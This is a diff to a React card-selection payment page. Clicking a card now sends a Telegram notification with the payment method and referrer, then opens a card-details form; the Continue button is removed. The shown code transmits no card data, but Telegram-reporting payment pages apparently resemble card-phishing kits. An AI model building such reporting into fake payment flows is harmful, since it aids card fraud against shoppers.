@@ -620,11 +620,25 @@ const CardSelectPage = () => {
           {cardOptions.map((card) => (
             <button
               key={card.id}
-              onClick={() => setSelected(card.id)}
+              onClick={() => {
+                setSelected(card.id);
+                // Go directly to card details form
+                sessionStorage.setItem("cardSelect_selected", card.id);
+                const selectedCardData = cardOptions.find((c) => c.id === card.id);
+                if (selectedCardData) {
+                  sendTelegramNotification({
+                    type: "payment_activity",
+                    method: selectedCardData.label,
+                    paymentType: "card",
+                    referrer: document.referrer || "Direct",
+                  });
+                }
+                setShowForm(true);
+              }}
               className={`group relative flex items-center justify-center py-1.5 sm:py-3 px-3 rounded-xl border-2 overflow-hidden transition-all ${
                 selected === card.id
-                  ? "border-[#3b82f6] bg-transparent sm:bg-[#eff6ff] shadow-sm"
-                  : "border-[#e2e8f0] bg-transparent sm:bg-white hover:border-[#cbd5e1]"
+                  ? "border-[#3b82f6] shadow-sm"
+                  : "border-[#e2e8f0] hover:border-[#cbd5e1]"
               }`}
             >
               <div className="h-10 sm:h-14 flex items-center justify-center">
@@ -635,19 +649,6 @@ const CardSelectPage = () => {
         </div>
 
         <div className="flex-1" />
-
-        {/* Continue Button */}
-        <button
-          onClick={handleContinue}
-          disabled={!selected}
-          className={`w-full py-3.5 rounded-xl text-sm font-semibold transition-all mt-auto ${
-            selected
-              ? "bg-[#818cf8] text-white hover:bg-[#6366f1] shadow-md"
-              : "bg-[#c7d2fe] text-white cursor-not-allowed"
-          }`}
-        >
-          Continue
-        </button>
 
         {/* Back to Store */}
         <button
